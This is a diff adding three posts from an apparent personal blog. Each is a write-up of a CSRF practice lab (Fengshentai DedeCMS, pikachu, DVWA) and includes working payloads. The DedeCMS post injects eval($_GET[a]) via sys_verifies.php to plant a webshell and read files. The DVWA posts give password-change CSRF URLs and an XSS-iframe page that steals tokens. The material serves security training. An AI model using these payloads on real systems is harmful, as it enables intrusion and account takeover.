@@ -434,6 +434,765 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/02/CSRF%E9%9D%B6%E5%9C%BA--%E5%B0%81%E7%A5%9E%E5%8F%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/04/02/CSRF%E9%9D%B6%E5%9C%BA--%E5%B0%81%E7%A5%9E%E5%8F%B0/" itemprop="url">CSRF靶场--封神台</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-02T16:08:22+08:00">
+                2020-04-02
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CSRF/" itemprop="url" rel="index">
+                    <span itemprop="name">CSRF</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  566 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  2 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-CSRF"><a href="#1-CSRF" class="headerlink" title="1. CSRF"></a>1. CSRF</h4><ul>
+<li>点开题目链接，审计一下题目<ul>
+<li>flag就在网站根目录 -&gt; 盲猜需要用到文件包含的思路</li>
+<li>后台密码为admin123<ul>
+<li>这么说需要找到后台，联想到本次作业为CSRF，登陆后台，借助管理员的Cookie就成立了</li>
+<li>后台密码为admin123，盲猜用户名为admin或者root</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p><img src="/images/csrf/dedecms/csrf-name.png" alt="csrf-name"></p>
+<ul>
+<li>点开链接<ul>
+<li>发现没有什么东西，网站目录也不是在根目录</li>
+<li>右键查看源代码，ctrl+f搜索dedecms，可以发现dedecms的版本</li>
+</ul>
+</li>
+</ul>
+<p><img src="/images/csrf/dedecms/csrf-version.png" alt="csrf-version"></p>
+<ul>
+<li>百度搜索dedecms，大多都是DedeCMS V57_UTF8_SP2版本的（真多漏洞）</li>
+<li>DedeCMS-V5.7_UTF8_SP1版本的，SQL注入，文件包含<ul>
+<li>只关心文件包含getshell的</li>
+</ul>
+</li>
+<li>发现一个CSDN上的链接<br>(weixin_33921089大佬的链接)[<a href="https://blog.csdn.net/weixin_33921089/article/details/93246790?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task]" target="_blank" rel="noopener">https://blog.csdn.net/weixin_33921089/article/details/93246790?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task]</a></li>
+<li>分析源码可知，漏洞在/dede/sys_verifies.php下<ul>
+<li>需要一个url中输入action，即getfiles</li>
+<li>然后会打开一个cacheFile=DEDEDATA.’/modifytmp.inc文件</li>
+<li>开始输入，发现包含了一个php的头</li>
+<li>foreach输入然后进行replace，可以用反斜线双引号</li>
+<li>涉及payload为：<code>http://localhost/dedecms/uploads/dede/sys_verifies.php?action=getfiles&amp;refiles[0]=123&amp;refiles[1]=\\&quot;;eval($_GET[a]);die();//</code></li>
+</ul>
+</li>
+<li>这时候需要另外一个包含inc文件且能执行的，发现在后面的代码中，有一个通过action=down来执行，包含inc文件的，触发shell：<code>http://localhost/dedecms/uploads/dede/sys_verifies.php?action=down&amp;a=phpinfo();</code></li>
+</ul>
+<p><img src="/images/csrf/dedecms/csrf-code.png" alt="csrf-code"></p>
+<ul>
+<li>信息收集一下，发现后台是/csrf/uploads/dede/login.php<ul>
+<li>弱口令admin/admin123登陆成功</li>
+<li>这时候浏览器应该有管理员的Cookie了</li>
+</ul>
+</li>
+</ul>
+<p><img src="/images/csrf/dedecms/csrf-login.png" alt="csrf-login"></p>
+<ul>
+<li>payload尝试<ul>
+<li>插入shell</li>
+<li>执行shell</li>
+<li>拿到phpinfo的信息</li>
+<li>搜索ducument，发现网站根目录</li>
+</ul>
+</li>
+</ul>
+<p><img src="/images/csrf/dedecms/csrf-phpinfo.png" alt="csrf-phpinfo"></p>
+<ul>
+<li>既然有了shell，读取一下网站根目录</li>
+<li>payload<ul>
+<li>继续使用action=down</li>
+<li>写入dir的路径</li>
+<li>scandir扫描路径</li>
+<li>print打印输出所有的文件</li>
+<li>action=down&amp;a=$dir=dirname(‘C:/phpStudy/WWW/csrf/uploads/‘);$file = scandir($dir);print_r($file);</li>
+</ul>
+</li>
+</ul>
+<p><img src="/images/csrf/dedecms/csrf-root.png" alt="csrf-root"> </p>
+<ul>
+<li>既然有了路径，那就读取吧</li>
+<li>payload：action=down&amp;a=readfile(‘C:/phpStudy/WWW/csrf/flag.php’);</li>
+</ul>
+<p><img src="/images/csrf/dedecms/csrf-flag.png" alt="csrf-flag"></p>
+<ul>
+<li>留有疑问<ul>
+<li>前面代码审计那里，payload的refiles[1]的绕过//“,是对什么的绕过？</li>
+</ul>
+</li>
+</ul>
+<h4 id="2-靶场说明"><a href="#2-靶场说明" class="headerlink" title="2. 靶场说明"></a>2. 靶场说明</h4><ul>
+<li>⭐ 感谢白熊老哥提供的封神台靶场练习，跟真的在挖洞一样，难度倍增，收获也很多</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/02/CSRF%E9%9D%B6%E5%9C%BA--pikachu/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/04/02/CSRF%E9%9D%B6%E5%9C%BA--pikachu/" itemprop="url">CSRF靶场--pikachu</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-02T16:08:22+08:00">
+                2020-04-02
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CSRF/" itemprop="url" rel="index">
+                    <span itemprop="name">CSRF</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  399 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  1 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-CSRF-get"><a href="#1-CSRF-get" class="headerlink" title="1. CSRF(get)"></a>1. CSRF(get)</h4><ul>
+<li>右上角的提示，发现有多个账号可以登陆</li>
+<li>账号：vince/allen/kobe/grady/kevin/lucy/lili 密码：123456</li>
+<li>选择vince/123456登陆</li>
+<li>发现可以修改个人信息，既然是get的请求，那我bp抓包一下并修改</li>
+<li>发觉数据都可以进行修改，还带了Cookie</li>
+</ul>
+<p><img src="/images/csrf/dvwa/csrf-get-data.png" alt="csrf-get-data"></p>
+<p><img src="/images/csrf/dvwa/csrf-get-change.png" alt="csrf-get-change"></p>
+<h4 id="2-CSRF-post"><a href="#2-CSRF-post" class="headerlink" title="2. CSRF(post)"></a>2. CSRF(post)</h4><ul>
+<li>登陆进来，一样的账户，一样的界面，但不一样的，是抓包发现的，是post数据</li>
+<li>一样的修改数据，一样的带了Cookie</li>
+<li>▲ bp的proxy会返回200OK，Repeater会返回302，但是都修改成功</li>
+</ul>
+<p><img src="/images/csrf/dvwa/csrf-post-data.png" alt="csrf-post-data"></p>
+<p><img src="/images/csrf/dvwa/csrf-post-change.png" alt="csrf-post-change"></p>
+<h4 id="3-CSRF-Token"><a href="#3-CSRF-Token" class="headerlink" title="3. CSRF Token"></a>3. CSRF Token</h4><ul>
+<li>登陆进来，一样的账户，一样的界面，又再一次抓包，发现这次是多了token</li>
+<li>▲ 每次刷新，Token都不一样</li>
+<li>只有在点击修改个人信息的时候，会去访问一个token_get_edit.php的页面，才会获得一个Token，且隐藏在一个hidden的表单中，这是可以利用的就是token_get_edit.php的页面</li>
+</ul>
+<p><img src="/images/csrf/dvwa/csrf-token.png" alt="csrf-token"></p>
+<ul>
+<li>攻击思路<ul>
+<li>同样找一个有XSS漏洞的页面，插入一个iframe：<code>&lt;iframe src=&quot;../csrf&quot;&gt;</code>，可能需要修改maxlength的长度</li>
+<li>发现可以拿到hidden中的Token：698085e82ed2acb762985707895</li>
+</ul>
+</li>
+</ul>
+<p><img src="/images/csrf/dvwa/csrf-iframe.png" alt="csrf-iframe"></p>
+<ul>
+<li>构造一个url：<a href="http://192.168.0.108/pikachu/vul/csrf/csrftoken/token_get_edit.php?sex=boy&amp;phonenum=18626545453&amp;add=china&amp;email=vince%40pikachu.cn&amp;token=698085e82ed2acb762985707895&amp;submit=submit#" target="_blank" rel="noopener">http://192.168.0.108/pikachu/vul/csrf/csrftoken/token_get_edit.php?sex=boy&amp;phonenum=18626545453&amp;add=china&amp;email=vince%40pikachu.cn&amp;token=698085e82ed2acb762985707895&amp;submit=submit#</a></li>
+</ul>
+<p><img src="/images/csrf/dvwa/csrf-token-pikachu.png" alt="csrf-token-pikachu"></p>
+<ul>
+<li>成功修改</li>
+<li>同样的，也能引用婷婷哈大佬的js代码文件去进行CSRF攻击</li>
+</ul>
+<h4 id="4-靶场说明"><a href="#4-靶场说明" class="headerlink" title="4. 靶场说明"></a>4. 靶场说明</h4><ul>
+<li>pikachu的CSRF靶场还是相对容易的</li>
+<li>无论是对于Referer头还是Token，都有一定的绕过方法</li>
+<li>但更安全的是，验证当前的密码而不是Cookie</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/02/CSRF%E9%9D%B6%E5%9C%BA--dvwa/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/04/02/CSRF%E9%9D%B6%E5%9C%BA--dvwa/" itemprop="url">CSRF靶场--dvwa</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-02T16:08:22+08:00">
+                2020-04-02
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CSRF/" itemprop="url" rel="index">
+                    <span itemprop="name">CSRF</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  2.5k 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  12 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-CSRF-Low"><a href="#1-CSRF-Low" class="headerlink" title="1. CSRF(Low)"></a>1. CSRF(Low)</h4><ul>
+<li>发现没有确认码、输入当前密码以及Token</li>
+<li>密码的传输也只通过URL传输</li>
+<li>可以很容易的构造payload：<a href="http://192.168.0.109/dvwa/vulnerabilities/csrf/?password_new=test&amp;password_conf=test&amp;Change=Change#" target="_blank" rel="noopener">http://192.168.0.109/dvwa/vulnerabilities/csrf/?password_new=test&amp;password_conf=test&amp;Change=Change#</a></li>
+<li>源码分析<ul>
+<li>首先获取输入的两个密码然后判断两个值是否相等</li>
+<li>若相等则接着对pass_new变量进行调用mysql_real_escape_string()函数来进行字符串的过滤</li>
+<li>再调用md5()函数对输入的密码进行MD5加密</li>
+<li>最后再将新密码更新到数据库中</li>
+<li>▲ 整段代码因为调用了mysql_real_escape_string()函数从而有效地过滤了SQL注入，但是对CSRF没有任何的防御机制</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_GET[ &apos;Change&apos; ] ) ) &#123;</span><br><span class="line">    // Get input</span><br><span class="line">    $pass_new  = $_GET[ &apos;password_new&apos; ];</span><br><span class="line">    $pass_conf = $_GET[ &apos;password_conf&apos; ];</span><br><span class="line"></span><br><span class="line">    // Do the passwords match?</span><br><span class="line">    if( $pass_new == $pass_conf ) &#123;</span><br><span class="line">        // They do!</span><br><span class="line">        $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">        $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">        // Update the database</span><br><span class="line">        $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;;</span><br><span class="line">        $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line"></span><br><span class="line">        // Feedback for the user</span><br><span class="line">        echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // Issue with passwords matching</span><br><span class="line">        echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-CSRF-Medium"><a href="#2-CSRF-Medium" class="headerlink" title="2. CSRF(Medium)"></a>2. CSRF(Medium)</h4><ul>
+<li>先改变账号的密码test123，发现没问题</li>
+<li>尝试用一下Low级别的payload：<a href="http://192.168.0.109/dvwa/vulnerabilities/csrf/?password_new=test&amp;password_conf=test&amp;Change=Change#" target="_blank" rel="noopener">http://192.168.0.109/dvwa/vulnerabilities/csrf/?password_new=test&amp;password_conf=test&amp;Change=Change#</a></li>
+<li>发现弹出错误</li>
+</ul>
+<p><img src="/images/csrf/dvwa/csrf-http_referer.png" alt="csrf-http_referer"></p>
+<ul>
+<li>F12打开网络，查看消息头，发现Referer是一个网络地址</li>
+</ul>
+<p><img src="/images/csrf/dvwa/csrf-network.png" alt="csrf-network"></p>
+<ul>
+<li>打开Burpsuite，抓取一个请求包，往请求头里面添加一个Referer，Referer头内容为Host字段内容，即可看到修改密码成功<ul>
+<li>▲ 2020.03.31 HackBar尝试失败，无法正常带上一个Referer</li>
+<li>▲ 127.0.0.1的Referer头无法修改密码</li>
+</ul>
+</li>
+</ul>
+<p><img src="/images/csrf/dvwa/csrf-bp.png" alt="csrf-bp"></p>
+<ul>
+<li>源码分析<ul>
+<li>在Low级别的基础上，添加了对Referer头的判断，是否包含了Host字段的内容</li>
+<li>HTTP_REFERER与SERVER_NAME的stripos()函数判断</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_GET[ &apos;Change&apos; ] ) ) &#123;</span><br><span class="line">    // Checks to see where the request came from</span><br><span class="line">    if( stripos( $_SERVER[ &apos;HTTP_REFERER&apos; ] ,$_SERVER[ &apos;SERVER_NAME&apos; ]) !== false ) &#123;</span><br><span class="line">        // Get input</span><br><span class="line">        $pass_new  = $_GET[ &apos;password_new&apos; ];</span><br><span class="line">        $pass_conf = $_GET[ &apos;password_conf&apos; ];</span><br><span class="line"></span><br><span class="line">        // Do the passwords match?</span><br><span class="line">        if( $pass_new == $pass_conf ) &#123;</span><br><span class="line">            // They do!</span><br><span class="line">            $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">            $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">            // Update the database</span><br><span class="line">            $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;;</span><br><span class="line">            $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line"></span><br><span class="line">            // Feedback for the user</span><br><span class="line">            echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            // Issue with passwords matching</span><br><span class="line">            echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // Didn&apos;t come from a trusted source</span><br><span class="line">        echo &quot;&lt;pre&gt;That request didn&apos;t look correct.&lt;/pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-CSRF-High"><a href="#3-CSRF-High" class="headerlink" title="3. CSRF(High)"></a>3. CSRF(High)</h4><ul>
+<li>先改变账号的密码test123，发现URL地址中多出了一个user_token：<a href="http://192.168.0.109/dvwa/vulnerabilities/csrf/?password_new=test123&amp;password_conf=test123&amp;Change=Change&amp;user_token=87d4d22790311704b656dff9308ec73a#" target="_blank" rel="noopener">http://192.168.0.109/dvwa/vulnerabilities/csrf/?password_new=test123&amp;password_conf=test123&amp;Change=Change&amp;user_token=87d4d22790311704b656dff9308ec73a#</a></li>
+<li>且每次修改密码，token都会发生变化，暂时无法破解</li>
+<li>▲ 以下答案来自婷婷哈大佬的解题–CSRF结合XSS漏洞<ul>
+<li>要绕过High级别的反CSRF机制，关键是要获取token，要利用受害者的cookie去修改密码的页面获取关键的token，试着去构造一个攻击页面，将其放置在攻击者的服务器，引诱受害者访问，从而完成CSRF攻击</li>
+<li>攻击思路<ul>
+<li>当受害者点击进入这个页面，脚本会通过一个看不见框架偷偷访问修改密码的页面，获取页面中的token，并向服务器发送改密请求，以完成CSRF攻击</li>
+<li>▲ 然而现实中有跨域问题，而现在的浏览器是不允许跨域请求的，只能将击代码注入到目标服务器中，才有可能完成攻击</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>攻击实现<ul>
+<li>找到一个有XSS漏洞的站点，这里选择XSS(stored)（同源站点，不然受同源策略影响）</li>
+<li>在name中修改maxlength的长度，并注入能利用的代码： <code>&lt;iframe src=&quot;../csrf&quot;&gt;</code></li>
+<li>提交后会返回一个包含csrf的页面，里面有存在user_token的值：d915919e613a4e8f9f1ab750f23571f0</li>
+<li>构造payload：<a href="http://192.168.0.109/dvwa/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change&amp;user_token=d915919e613a4e8f9f1ab750f23571f0#" target="_blank" rel="noopener">http://192.168.0.109/dvwa/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change&amp;user_token=d915919e613a4e8f9f1ab750f23571f0#</a></li>
+<li>成功修改密码</li>
+<li>▲ 也可用此代码：<code>&lt;iframe src=&quot;../csrf&quot; onload=alert(frames[0].document.getElenentsByName(&#39;user_token&#39;)[0].value)&gt;</code></li>
+</ul>
+</li>
+</ul>
+<p><img src="/images/csrf/dvwa/csrf-token-dvwa.png" alt="csrf-token-dvwa"></p>
+<ul>
+<li>下面为婷婷哈大佬写的js文件，用于修改密码，在这基础上，将js文件在XSS平台编辑，然后找到一个有XSS漏洞的站点，修改URL发给受害者</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">function attack()&#123;</span><br><span class="line"></span><br><span class="line">    document.getElementsByName(&apos;user_token&apos;)[0].value=document.getElementById(&quot;hack&quot;).contentWindow.document.getElementsByName(&apos;user_token&apos;)[0].value;</span><br><span class="line"></span><br><span class="line">    document.getElementById(&quot;transfer&quot;).submit();</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe src=&quot;http://192.168.0.109/dvwa/vulnerabilities/csrf&quot; id=&quot;hack&quot; border=&quot;0&quot; style=&quot;display:none;&quot;&gt;</span><br><span class="line">&lt;/iframe&gt;</span><br><span class="line"></span><br><span class="line">&lt;body onload=&quot;attack()&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;form method=&quot;GET&quot; id=&quot;transfer&quot; action=&quot;http://192.168.0.109/dvwa/vulnerabilities/csrf&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;password_new&quot; value=&quot;password&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;password_conf&quot; value=&quot;password&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;user_token&quot; value=&quot;&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;Change&quot; value=&quot;Change&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>源码分析<ul>
+<li>在Low级别的基础上，增加了对Session中session_token的判断，且一次随机性</li>
+<li>High级别的代码加入了Anti-CSRF token机制，用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 